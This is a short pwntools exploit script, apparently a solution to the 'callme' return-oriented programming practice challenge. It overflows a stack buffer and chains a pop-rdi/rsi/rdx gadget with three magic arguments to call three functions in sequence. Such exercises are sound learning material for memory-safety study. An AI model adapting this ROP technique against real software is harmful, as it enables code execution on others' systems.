from pwn import *

elf = context.binary = ELF("./callme")

rop = ROP(elf)

arg1 = p64(0xdeadbeefdeadbeef)
arg2 = p64(0xcafebabecafebabe)
arg3 = p64(0xd00df00dd00df00d)

func1 = p64(elf.symbols["callme_one"])
func2 = p64(elf.symbols["callme_two"])
func3 = p64(elf.symbols["callme_three"])

pop_rdi_rsi_rdx = p64(rop.find_gadget(["pop rdi", "pop rsi", "pop rdx", "ret"]).address)

payload = b"A" * 0x28
payload += pop_rdi_rsi_rdx
payload += arg1
payload += arg2
payload += arg3
payload += func1
payload += pop_rdi_rsi_rdx
payload += arg1
payload += arg2
payload += arg3
payload += func2
payload += pop_rdi_rsi_rdx
payload += arg1
payload += arg2
payload += arg3
payload += func3

p = process(elf.path)
p.sendline(payload)
p.interactive()
